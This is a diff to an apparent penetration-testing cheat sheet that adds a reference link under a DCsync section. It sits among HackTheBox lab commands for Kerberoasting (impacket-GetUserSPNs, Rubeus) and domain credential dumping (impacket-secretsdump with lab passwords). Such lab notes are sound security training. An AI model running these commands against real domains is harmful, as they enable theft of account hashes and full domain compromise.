@@ -524,6 +524,7 @@ impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStro
 .\Rubeus.exe kerberoast /nowrap /format:hashcat /dc: /tgtdeleg
 ```
 #### DCsync
+https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets
 ```bash
 impacket-secretsdump htb.local/userattk:takSecbe987@10.10.10.161 -just-dc
 impacket-secretsdump htb.local/userattk:takSecbe987@10.10.10.161 -just-dc-user Administrator -just-dc-ntlm
